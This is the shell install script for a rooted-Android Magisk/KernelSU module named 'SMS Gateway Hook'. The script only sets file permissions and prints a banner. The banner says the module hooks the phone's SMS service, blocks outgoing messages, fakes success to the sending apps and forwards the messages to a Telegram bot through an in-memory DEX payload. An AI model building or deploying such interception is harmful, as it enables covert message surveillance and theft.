#!/system/bin/sh
# Customize script for KernelSU / Magisk module installation

MODPATH="${MODPATH:-$MODDIR}"

ui_print "- Installing SMS Gateway Hook v1.0"
ui_print ""

# Set permissions for zygisk .so files
if [ -d "$MODPATH/zygisk" ]; then
    chmod 755 "$MODPATH/zygisk"
    for f in "$MODPATH/zygisk"/*.so; do
        if [ -f "$f" ]; then
            chmod 644 "$f"
        fi
    done
    ui_print "  ✓ Zygisk libraries"
fi

# Set permissions for scripts
for script in service.sh; do
    if [ -f "$MODPATH/$script" ]; then
        chmod 755 "$MODPATH/$script"
        ui_print "  ✓ $script"
    fi
done

# Set permissions for module.prop
chmod 644 "$MODPATH/module.prop"

ui_print ""
ui_print "  ╔══════════════════════════════════════╗"
ui_print "  ║  SMS Gateway Hook                    ║"
ui_print "  ║                                      ║"
ui_print "  ║  • Hooks ISms in com.android.phone  ║"
ui_print "  ║  • Blocks all outgoing SMS           ║"
ui_print "  ║  • Fakes success to calling apps     ║"
ui_print "  ║  • Forwards to Telegram bot          ║"
ui_print "  ╚══════════════════════════════════════╝"
ui_print ""
ui_print "  Monitor: adb logcat -s NI:V"
ui_print ""
ui_print "- Reboot to activate SMS interception"

# SMS injection is embedded in the Zygisk DEX payload (in-memory, no physical file)
ui_print "  ✓ SMS injector embedded in Zygisk DEX (in-memory)"

